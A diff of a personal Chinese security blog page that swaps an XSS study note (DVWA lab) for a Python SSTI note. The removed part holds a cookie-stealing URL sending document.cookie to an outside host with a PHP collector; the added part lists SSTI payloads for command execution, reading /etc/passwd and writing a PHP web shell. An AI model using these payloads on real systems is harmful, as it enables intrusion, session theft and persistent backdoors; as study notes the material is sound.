@@ -3,7 +3,7 @@
 <html lang="zh_CN">
 <head>
     <meta charset="utf-8" />
-    <title>XSS跨站脚本攻击 | Tremseの部屋</title>
+    <title>Python的各种各样 | Tremseの部屋</title>
     <meta name="author" content="Tremse" />
     <meta name="description" content="" />
     <meta name="keywords" content="" />
@@ -156,14 +156,14 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>XSS跨站脚本攻击</h1>
+        <h1>Python的各种各样</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2024/11/7
+            2024/11/27
         </span>
         
         <span class="category">
@@ -184,15 +184,15 @@
             
             <span class="tag">
                 
-                <a href="/tags/Web/" style="color: #03a9f4">
+                <a href="/tags/Web/" style="color: #00a596">
                     Web
                 </a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/PHP/" style="color: #ffa2c4">
-                    PHP
+                <a href="/tags/Py/" style="color: #03a9f4">
+                    Py
                 </a>
             </span>
             
@@ -201,30 +201,63 @@
     </div>
     
     <div class="content" v-pre>
-        <blockquote>
-<p>这是我的笔记！不太好参考噢~</p>
-</blockquote>
-<p>&emsp;&emsp;XSS即跨站脚本攻击(Cross Site Scripting),本来应该缩写成css，但毕竟三大件有了，就叫xss了。<font color="#ff9f9f"><strong>只有动态网站才有会被xss的可能</strong></font>，因为xss原理就是在网页中注入而已js语句，在用户访问时执行它们来达到目的，静态网站由于没有注入点(毕竟不需要交互，没有输入)是不会被攻击的。<br>&emsp;&emsp;比如某个页面后端用php编写，有以下源码:</p>
-<pre><code class="PHP">&lt;?php
-$xss = $_GET[&#39;x&#39;];
-echo $xss;
-?&gt;
+        <h3 id="内置属性模块等"><a href="#内置属性-模块等" class="headerlink" title="内置属性,模块等"></a>内置属性,模块等</h3><ul>
+<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__base__</span>:类对象的属性,返回当前类的<font color="#ff9f9f"><strong>直接父类字符串</strong></font>。可以用来获取Object类。</li>
+<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__bases__</span>:类对象的属性,返回当前类的<font color="#ff9f9f"><strong>直接父类元组</strong></font>。可以用来获取Object类。</li>
+<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__mro__</span>:类对象的属性，返回一个元组，存有类的“方法解析顺序”，可以简单的理解成这个类构造的链（类比js原型链）。可以用来获取Object类。</li>
+<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__subclasses__()</span>:类对象的属性,返回当前类的所有<font color="#ff9f9f"><strong>直接子类</strong></font>列表。可以用来获取可利用的类。</li>
+<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__class__</span>:各种对象的属性,返回它的所属类。可以用来连接到类对象，方便后续操作。</li>
+<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__init__</span>:类对象都有的函数（初始化函数）。可以用来间接获取__globals__。</li>
+<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__globals__</span>:函数的属性，返回当前函数所处空间下可使用的module、方法以及所有变量。可以用来获取可利用的类。</li>
+<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__dict__</span>:类对象或类实例的属性,查看对象内部所有属性名和属性值组成的字典。可以用来获取可利用的类。</li>
+<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__builtins__</span>:内建模块，用于定义内建命名空间，使得我们可以使用内建命名空间中定义的函数。可以利用这个模块导入一些模块到内建命名空间中加以利用(如os)</li>
+<li><span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__import__</span>:魔术方法，用于导入模块，常配合<span style="background:#efefef;border: 0.01rem solid;border-radius: 2px;border-color:#dfdfdf;">__builtins__</span>导入os模块</li>
+</ul>
+<h3 id="常用类以py-ssti为例"><a href="#常用类-以py-ssti为例" class="headerlink" title="常用类(以py-ssti为例)"></a>常用类(以py-ssti为例)</h3><ul>
+<li>利用warnings.catch_warnings配合__builtins__得到eval函数借此进行rce</li>
+</ul>
+<pre><code class="python"># 注意__subclasss__的元素索引需要根据实际修改
+&#123;&#123;[].__class__.__base__.__subclasses__()[138].__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()&#125;&#125;
 </code></pre>
-<p>&emsp;&emsp;那么很明显，我们可以通过控制x这个用户输入变量来干一些事情，插入一段js代码不在话下，这就是最简单的xss攻击了。</p>
-<h3 id="xss攻击的类型"><a href="#XSS攻击的类型" class="headerlink" title="XSS攻击的类型"></a>XSS攻击的类型</h3><h4 id="emsp1反射型非持久化xss"><a href="#emsp-1-反射型·非持久化XSS" class="headerlink" title="&emsp;1.反射型·非持久化XSS"></a>&emsp;<font color="#5f5f5f">1.反射型·非持久化XSS</font></h4><p>&emsp;&emsp;一次性的XSS攻击，将XSS代码通过url中参数的形式发送至服务器，让其解析并返回含有XSS的结果给浏览器，使之执行XSS代码，达到攻击目的。<br>&emsp;&emsp;通过某些手段(比如rz学长非常喜欢玩的QR-code)让用户访问存在XSS的url，使得XSS攻击成功。一个应用就是拿取用户在本站的cookie。<br>&emsp;&emsp;以DVWA靶场的反射型XSS为例，如果我们如此构造一个url(注意靶场url，我是用docker部署的，8087端口映射到80)(注意script标签是不准确的，因为标准的会被识别为html标签所以这样绕过):</p>
-<pre><code class="URL">http://localhost:8087/vulnerabilities/xss_r/?name=&lt;&quot;scripts&gt;document.location=&#39;http://192.168.43.15/cookiein.php?cookie=&#39;+document.cookie;&lt;&quot;/scripts&gt;
+<ul>
+<li>利用os._wrap_close类所属空间下可用的popen函数进行RCE</li>
+</ul>
+<pre><code class="python">&#123;&#123;"".__class__.__base__.__subclasses__()[128].__init__.__globals__.popen('whoami').read()&#125;&#125;
+&#123;&#123;"".__class__.__base__.__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;
 </code></pre>
-<p>&emsp;&emsp;并且在我们的服务器上有这么一个页面(部署在”192.168.43.15&#x2F;cookiein.php”):</p>
-<pre><code class="PHP">&lt;?php
-$cookie=$_GET[&#39;cookie&#39;];
-file_put_contents(&#39;cookie.txt&#39;,$cookie);
-?&gt;
+<ul>
+<li>利用subprocess.Popen类进行RCE的payload</li>
+</ul>
+<pre><code class="python">&#123;&#123;''.__class__.__base__.__subclasses__()[479]('whoami',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;
 </code></pre>
-<p>&emsp;&emsp;那么只要某个用户通过这个url进入靶场，那么就可以得到他的cookie并且存储到cookie.txt中。</p>
-<h4 id="emsp2存储型持久化xss"><a href="#emsp-2-存储型·持久化XSS" class="headerlink" title="&emsp;2.存储型·持久化XSS"></a>&emsp;<font color="#5f5f5f">2.存储型·持久化XSS</font></h4><p>&emsp;&emsp;存储型XSS和反射型XSS的差别仅在于，<font color="#ff9f9f"><strong>提交的代码会存储在服务器端</strong></font>（数据库、内存、文件系统等），下次有用户请求目标页面时XSS会再次运行(已经成为了页面的一部分了)，从而攻击成功。这样甚至不用诱导目标访问某个url就能达到目的。<br>&emsp;&emsp;也就是说，只要进行一次XSS攻击，XSS恶意代码就会被保留在页面中，只要有用户访问该页面，就会触发。其它的和反射型XSS是一致的。</p>
-<h4 id="emsp3dom型xss"><a href="#emsp-3-DOM型XSS" class="headerlink" title="&emsp;3.DOM型XSS"></a>&emsp;<font color="#5f5f5f">3.DOM型XSS</font></h4><p>&emsp;&emsp;利用步骤和反射型很类似，但是唯一的区别就是，构造的URL参数<font color="#ff9f9f"><strong>不用发送到服务器端</strong></font>，可以达到绕过WAF、躲避服务端检测的效果。</p>
+<ul>
+<li>利用__import__导入os模块进行利用</li>
+</ul>
+<pre><code class="python">&#123;&#123;"".__class__.__bases__.__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()&#125;&#125;
+</code></pre>
+<ul>
+<li>利用linecache类所属空间下可用的os模块进行RCE的payload</li>
+</ul>
+<pre><code class="python">&#123;&#123;"".__class__.__bases__.__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()&#125;&#125;
+</code></pre>
+<ul>
+<li>利用file类（仅python2可用）进行文件读入</li>
+</ul>
+<pre><code class="python">&#123;&#123;[].__class__.__base__.__subclasses__()[40]('etc/passwd').read()&#125;&#125;
+</code></pre>
+<ul>
+<li>通用getshell，都是通过__builtins__调用eval进行代码执行</li>
+</ul>
+<pre><code class="python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+</code></pre>
+<ul>
+<li>读写文件，通过__builtins__调用open进行文件读写</li>
+</ul>
+<pre><code class="python">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('var/www/html/a.php', 'r').write("<?php @system($_GET['x'])?>") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;
+</code></pre>
 <blockquote>
-<p>详细例子见<a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/12542695.html">这里</a>~</p>
+<p>参考 &#x1F970;:<br>    - <a target="_blank" rel="noopener" href="https://www.cnblogs.com/tuzkizki/p/15394415.html">Python SSTI漏洞学习总结 </a></p>
 </blockquote>
 
     </div>
